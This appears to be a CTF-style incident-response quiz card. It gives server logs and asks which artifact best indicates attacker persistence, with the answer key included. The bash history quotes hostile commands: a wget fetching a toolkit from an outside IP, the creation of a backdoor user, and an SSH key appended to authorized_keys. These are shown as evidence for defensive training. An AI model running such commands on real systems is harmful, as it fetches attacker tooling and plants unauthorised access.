![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Hard CTF – Incident Timeline Reconstruction

You are asked to build a quick timeline from server artifacts.

### Authentication log

```
02:11 Accepted password for deploy from 203.0.113.5
```

### Bash history (deploy user)

```
02:13 wget http://203.0.113.5/toolkit.tar.gz
02:14 tar -xf toolkit.tar.gz
02:16 sudo useradd backupsvc
02:18 echo "ssh-rsa AAA..." >> /home/backupsvc/.ssh/authorized_keys
```

### Network log

```
02:25 outbound ssh connection to 203.0.113.5
```

---

## Question

What is the clearest indicator of attacker persistence?

---

## Flags (Choose One)

- **A)** Downloading a toolkit archive
- **B)** Opening an outbound SSH connection once
- **C)** Extracting files with tar
- **D)** Creating a new user with SSH key access

---

Correct Flag: **D**

---

# Finished?

[Back to Card's Main Page](/Decks/CORE_v3.1/DET/Server_Analysis.md)
